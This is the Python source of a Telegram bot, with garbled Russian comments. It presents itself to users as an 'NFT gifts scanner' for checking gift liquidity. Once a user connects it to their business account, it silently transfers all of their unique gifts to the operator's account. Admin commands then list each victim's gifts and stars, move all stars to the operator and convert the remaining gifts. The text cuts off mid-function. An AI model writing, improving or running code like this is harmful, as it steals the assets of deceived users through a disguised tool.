from aiogram import types, Dispatcher, Bot, F
from aiogram.types import business_connection
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods import TransferGift
from aiogram.types import InputMediaPhoto, FSInputFile
from aiogram.types import InlineQuery, InlineQueryResultArticle, InputTextMessageContent
from custom_methods import GetFixedBusinessAccountStarBalance

import logging
import asyncio
import json
import config
import os

CONNECTIONS_FILE = "business_connections.json"

TOKEN = config.BOT_TOKEN
ADMIN_ID = config.ADMIN_ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    # –ü—Ä–∏–º–µ—Ä: –∑–∞–≥—Ä—É–∂–∞–µ–º –∏–∑ —Ñ–∞–π–ª–∞ –∏–ª–∏ —Å–ª–æ–≤–∞—Ä—è
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å #{user_id} –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞.")
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

@dp.business_connection()
async def handle_business_connect(business_connection: business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)
        await bot.send_message(business_connection.user.id, "–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ... –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è üîÑ")
        save_business_connection_data(business_connection)

        try:
            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                remove_connection(business_connection.id)
                await bot.send_message(ADMIN_ID,f"‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è #{business_connection.user.id} –Ω–µ–¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –∏ —É–¥–∞–ª–µ–Ω–æ.")
                return
            else:
                raise
        transferred = 0
        for gift in gifts.gifts:
            if gift.type == "unique":
                try:
                    await bot(TransferGift(
                        business_connection_id=business_connection.id,
                        new_owner_chat_id=int(ADMIN_ID),
                        owned_gift_id=gift.owned_gift_id,
                        star_count=25  # –±–µ–∑ –∫–æ–º–∏—Å—Å–∏–∏, –µ—Å–ª–∏ –Ω—É–∂–Ω–æ ‚Äî —É–∫–∞–∂–∏ 25
                    ))
                    transferred += 1
                except Exception as e:
                    logging.warning(f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫: {gift.owned_gift_id}: {e}")

        await bot.send_message(business_connection.user.id, f"‚úÖ –ü–æ–¥–∫–ª—é—á–µ–Ω–æ. ")

        logging.info(f"–ë–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω: {business_connection.user.id}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")
def remove_connection(business_connection_id):
    try:
        if not os.path.exists(CONNECTIONS_FILE):
            return
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            connections = json.load(f)
        connections = [c for c in connections if c.get("business_connection_id") != business_connection_id]
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(connections, f, indent=2, ensure_ascii=False)
        logging.info(f"–£–¥–∞–ª–µ–Ω–æ –æ—Ç–∫–ª—é—á—ë–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ: {business_connection_id}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —É–¥–∞–ª–µ–Ω–∏–∏ –∑–∞–ø–∏—Å–∏ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏")

@dp.business_message()
async def handler_message(message: Message):
    try:
        conn_id = message.business_connection_id
        sender_id = message.from_user.id
        msg_id = message.message_id

        connections = load_connections()
        connection = next((c for c in connections if c["business_connection_id"] == conn_id), None)

        if not connection:
            print(f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±–∏–∑–Ω–µ—Å connection_id: {conn_id}")
            return

    except Exception as e:
       logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–≤–µ—Ç–µ.")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 25

    if message.from_user.id != ADMIN_ID:
        builder = InlineKeyboardBuilder()
        builder.button(text="üîç Start Scanning", callback_data='verify')
        auth = builder.as_markup()

        photo = FSInputFile("media/4.jpg")
        caption = (f"–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ @nft_giftsScannerbot - —ç—Ç–æ—Ç –±–æ—Ç –í–∞—à –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∏ –ø–æ–º–æ—â–Ω–∏–∫ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–æ–≤ Telegram!\n\n–ü—Ä–æ–∞–Ω–∞–ª–∏–∑–∏—Ä—É–π—Ç–µ –ª—é–±–æ–π —á–∞—Ç, —á—Ç–æ–±—ã –≤—ã—è—Å–Ω–∏—Ç—å, –∫–∞–∫–∏–µ –ø–æ–¥–∞—Ä–∫–∏ –∏–º–µ—é—Ç –≤—ã—Å–æ–∫—É—é –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç—å, –∞ –∫–∞–∫–∏–µ –º–æ–≥—É—Ç –±—ã—Ç—å –º–µ–Ω–µ–µ —Ü–µ–Ω–Ω—ã–º–∏.\n\nüîπ–ë—ã—Å—Ç—Ä—ã–π –∞–Ω–∞–ª–∏–∑ –ª–∏–∫–≤–∏–¥–Ω–æ—Å—Ç–∏ –ø–æ–¥–∞—Ä–∫–æ–≤\nüîπ–£–¥–æ–±–Ω—ã–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –∏ –ø–æ–∏—Å–∫–∞.\nüîπ–ë—ã—Å—Ç—Ä–æ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞–π—Ç–µ –Ω–µ–ª–∏–∫–≤–∏–¥–Ω—ã–µ –∏–ª–∏ –º–∞–ª–æ—Ü–µ–Ω–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏.")
        await message.answer_photo(photo=photo, caption=caption, reply_markup=auth)
    else:
        await message.answer(
            f"owner: ...\nüîó –ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π: {count}\n/gifts - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –≥–∏—Ñ—Ç—ã\n/stars - –ø—Ä–æ—Å–º–æ—Ç—Ä–µ—Ç—å –∑–≤–µ–∑–¥—ã\n/transfer <owned_id> <business_connect> - –ø–µ—Ä–µ–¥–∞—Ç—å –≥–∏—Ñ—Ç –≤—Ä—É—á–Ω—É—é\n/convert - –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã")

@dp.message(F.text.startswith("/transfer"))
async def transfer_gift_handler(message: Message, bot):
    if  message.from_user.id != ADMIN_ID:
        return
    
    try:
        args = message.text.strip().split()
        if len(args) != 3:
            return await message.answer("–ò—Å–ø–æ–ª—å–∑—É–π —Ñ–æ—Ä–º–∞—Ç: /transfer <owned_gift_id> <business_connection_id>")

        owned_gift_id = args[1]
        connection_id = args[2]
        if not connection_id:
            return await message.answer("‚ùå –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

        result = await bot(TransferGift(
            business_connection_id=connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=owned_gift_id,
            star_count=25
        ))

        await message.answer("‚úÖ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω —Ç–µ–±–µ!")

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏: {e.message}")
    except Exception as e:
        await message.answer(f"‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞: {e}")


@dp.message(F.text == "/gifts")
async def handle_gifts_list(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    try:
        with open("business_connections.json", "r") as f:
            connections = json.load(f)

        if not connections:
            await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!")
            return

        kb = InlineKeyboardBuilder()
        for conn in connections:
            name = f"@{conn.get('username')} ({conn['user_id']})" or f"ID {conn['user_id']}"
            user_id = conn["user_id"]
            kb.button(
                text=name,
                callback_data=f"gifts:{user_id}"
            )

        await message.answer("–í—ã–±–µ—Ä–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:", reply_markup=kb.as_markup())

    except FileNotFoundError:
        await message.answer("–§–∞–π–ª –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π –Ω–µ –Ω–∞–π–¥–µ–Ω.")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π")

@dp.callback_query(F.data.startswith("gifts:"))
async def handle_gift_callback(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split(":", 1)[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)

        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –¥–ª—è —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        star_balance = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        text = f"üÜî –ë–∏–∑–Ω–µ—Å –∫–æ–Ω–Ω–µ–∫—Ç: <b>{business_connection_id}</b>\n‚≠êÔ∏è –ë–∞–ª–∞–Ω—Å –∑–≤—ë–∑–¥: <b>{star_balance.star_amount}</b>\n\n"
        keyboard = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ (–∏ –ø—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã)", callback_data=f"reveal_all_gifts:{user_id}")],
                            [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")]
                        ]
                    )
        await callback.message.answer(text, parse_mode="HTML", reply_markup=keyboard)
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            text += "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
            await callback.message.answer(text)
        else:
            for gift in gifts.gifts:
                if gift.type == "unique":
                    text = (
                        f"{gift.gift.base_name} #{gift.gift.number}\nOwner: #{user_id}\nOwnedGiftId: {gift.owned_gift_id}\n\n"
                        f"üéÅ <b>https://t.me/nft/{gift.gift.name}</b>\n"
                        f"üÜî –ú–æ–¥–µ–ª—å: <code>{gift.gift.model.name}</code>\n\n\n‚≠êÔ∏è –°—Ç–æ–∏–º–æ—Å—Ç—å —Ç—Ä–∞–Ω—Å—Ñ–µ—Ä–∞: {gift.transfer_star_count} ‚≠êÔ∏è"
                    )
                    kb = InlineKeyboardMarkup(
                            inline_keyboard=[
                                [
                                    InlineKeyboardButton(
                                        text="üéÅ –ü–µ—Ä–µ–¥–∞—Ç—å –º–Ω–µ",
                                        callback_data=f"transfer:{user_id}:{gift.owned_gift_id}:{gift.transfer_star_count}"
                                    )
                                ]
                            ]
                        )
                    await callback.message.answer(text, parse_mode="HTML", reply_markup=kb)
                    await asyncio.sleep(0.2)
            await callback.message.answer("üëá –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=keyboard)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –ø–æ–¥–∞—Ä–∫–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
 
@dp.callback_query(F.data.startswith("transfer:"))
async def handle_transfer(callback: CallbackQuery):
    await callback.answer()

    if callback.from_user.id != ADMIN_ID:
        return

    try:
        _, user_id_str, gift_id, transfer_price = callback.data.split(":")
        user_id = int(user_id_str)

        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)

        connection = next((c for c in connections if c["user_id"] == user_id), None)
        if not connection:
            await callback.message.answer("–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")
            return

        business_connection_id = connection["business_connection_id"]

        result = await bot(TransferGift(
            business_connection_id=business_connection_id,
            new_owner_chat_id=int(ADMIN_ID),
            owned_gift_id=gift_id,
            star_count=0
        ))

        if result:
            await callback.message.answer("üéâ –ü–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω —Ç–µ–±–µ!")
        else:
            await callback.message.answer("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–µ—Ä–µ–¥–∞—Ç—å –ø–æ–¥–∞—Ä–æ–∫.")

    except TelegramBadRequest as e:
        if "PAYMENT_REQUIRED" in e.message:
            await bot(TransferGift(
                business_connection_id=business_connection_id,
                new_owner_chat_id=int(ADMIN_ID),
                owned_gift_id=gift_id,
                star_count=25
            ))
        elif "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–µ—Ä–µ–¥–∞—á–µ –ø–æ–¥–∞—Ä–∫–∞")
        await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")


@dp.message(F.text == "/stars")
async def show_star_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞!")
        return
    
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!")
        return

    if not connections:
        await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!")
        return

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"stars:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("üîπ –í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –±–∞–ª–∞–Ω—Å–∞ –∑–≤—ë–∑–¥:", reply_markup=kb)

@dp.callback_query(F.data.startswith("stars:"))
async def show_user_star_balance(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    # –ó–∞–≥—Ä—É–∂–∞–µ–º –∫–æ–Ω–µ–∫—Ç
    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    conn = next((c for c in connections if c["user_id"] == user_id), None)
    if not conn:
        await callback.answer("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.", show_alert=True)
        return

    business_connection_id = conn["business_connection_id"]

    try:
        # –ü–æ–ª—É—á–∞–µ–º –±–∞–ª–∞–Ω—Å
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_count = response.star_amount

        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚ú® –ü–µ—Ä–µ–¥–∞—Ç—å –∑–≤–µ–∑–¥—ã –º–Ω–µ", callback_data=f"transfer_stars:{business_connection_id}")]
        ])

        await callback.message.answer(f"‚≠ê <b>–£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {conn['first_name']} {conn['last_name'] or ''} ‚Äî {star_count} –∑–≤—ë–∑–¥.</b>", parse_mode="HTML", reply_markup=kb)
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞: {e.message}")

@dp.callback_query(F.data.startswith("transfer_stars:"))
async def transfer_stars_to_admin(callback: CallbackQuery):
    business_connection_id = callback.data.split(":")[1]

    try:
        response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection_id))
        star_balance = response.star_amount

        result = await bot.transfer_business_account_stars(
            business_connection_id=business_connection_id,
            star_count=star_balance
        )
        if result:
            await callback.message.answer("‚úÖ –ó–≤–µ–∑–¥—ã —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–¥–∞–Ω—ã –≤–∞–º!")
        else:
            await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e.message}")
    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            await callback.message.answer("‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø –∫ –≥–∏—Ñ—Ç–∞–º!")
        else:
            await callback.message.answer(f"–û—à–∏–±–∫–∞: {e}")
    except TelegramBadRequest as e:
        await callback.message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–¥–∞—á–∏ –∑–≤—ë–∑–¥: {e.message}")

async def convert_non_unique_gifts_to_stars(bot: Bot, business_connection_id: str) -> str:
    try:
        # –ü–æ–ª—É—á–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))
        gifts = gifts_response.gifts

        count = 0
        for gift in gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection_id,
                        owned_gift_id=gift.gift.id
                    ))
                    count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue  # –ø—Ä–æ—Å—Ç–æ –ø—Ä–æ–ø—É—Å–∫–∞–µ–º
                    else:
                        raise e  # –ø—Ä–æ–±—Ä–∞—Å—ã–≤–∞–µ–º –¥—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏

        if count == 0:
            return "–£ –≤–∞—Å –Ω–µ—Ç –æ–±—ã—á–Ω—ã—Ö (–Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö) –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏."
        return f"‚úÖ –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ {count} –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ –∑–≤—ë–∑–¥—ã."

    except TelegramBadRequest as e:
        if "BOT_ACCESS_FORBIDDEN" in str(e):
            return "‚ö†Ô∏è –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∑–∞–ø—Ä–µ—Ç–∏–ª –¥–æ—Å—Ç—É–ø"
        return f"‚ö†Ô∏è –û—à–∏–±–∫–∞: {e}"
    except Exception as e:
        return f"‚ùå –ù–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}"

@dp.message(F.text == "/convert")
async def convert_menu(message: Message):
    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception:
        return await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

    if not connections:
        return await message.answer("‚ùå –ù–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç–æ–≤!.")

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"@{conn['username']} ({conn['user_id']})", callback_data=f"convert_select:{conn['user_id']}")]
        for conn in connections
    ])

    await message.answer("–í—ã–±–µ—Ä–∏—Ç–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞–Ω–∏—è –ø–æ–¥–∞—Ä–∫–æ–≤:", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("convert_select:"))
async def convert_select_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    with open("business_connections.json", "r", encoding="utf-8") as f:
        connections = json.load(f)

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="‚ôªÔ∏è –ü—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –æ–±—ã—á–Ω—ã–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã",
                    callback_data=f"convert_exec:{user_id}"
                )
            ]
        ]
    )

    await callback.message.edit_text(
        f"–í—ã–±—Ä–∞–Ω –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{connection.get('username', '–Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ')}",
        reply_markup=keyboard
    )

from aiogram.methods import GetBusinessAccountGifts, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
from aiogram.types import CallbackQuery
from aiogram import F

@dp.callback_query(F.data.startswith("convert_exec:"))
async def convert_exec_handler(callback: CallbackQuery):
    user_id = int(callback.data.split(":")[1])

    try:
        with open("business_connections.json", "r", encoding="utf-8") as f:
            connections = json.load(f)
    except Exception as e:
        return await callback.message.edit_text("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è.")

    connection = next((c for c in connections if c["user_id"] == user_id), None)
    if not connection:
        return await callback.message.edit_text("‚ùå –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.")

    try:
        # –ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∞—Ä–∫–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
        response = await bot(GetBusinessAccountGifts(
            business_connection_id=connection["business_connection_id"]
        ))
        gifts = response.gifts
    except TelegramBadRequest as e:
        return await callback.message.edit_text(f"–û—à–∏–±–∫–∞: {e.message}")
    
    if not gifts:
        return await callback.message.edit_text("üéÅ –£ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –Ω–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤.")

    converted_count = 0
    failed = 0
    for gift in gifts:
        if gift.type == "unique":
            continue

        try:
            print(gift.gift.id)
            await bot(ConvertGiftToStars(
                business_connection_id=connection["business_connection_id"],
                owned_gift_id=str(gift.owned_gift_id)
            ))
            converted_count += 1
        except TelegramBadRequest as e:
            print(e)
            failed += 1
        except Exception as e:
            print(e)
            failed += 1

    await callback.message.edit_text(
        f"‚úÖ –£—Å–ø–µ—à–Ω–æ –∫–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–æ: {converted_count} –ø–æ–¥–∞—Ä–∫–æ–≤.\n"
        f"‚ùå –û—à–∏–±–æ–∫: {failed}"
    )

@dp.message(F.text == "/test")
async def test(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.reply("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return
    await message.answer("–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. –ë–æ—Ç –≥–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!")


@dp.callback_query(F.data == "verify")
async def handle_verify(callback: types.CallbackQuery):
    chat_id = callback.from_user.id
    
    await callback.message.delete()
    
    connections = load_connections()
    user_connected = any(str(chat_id) == str(conn["user_id"]) for conn in connections)
    
    if user_connected:
        await bot.send_message(
            chat_id,
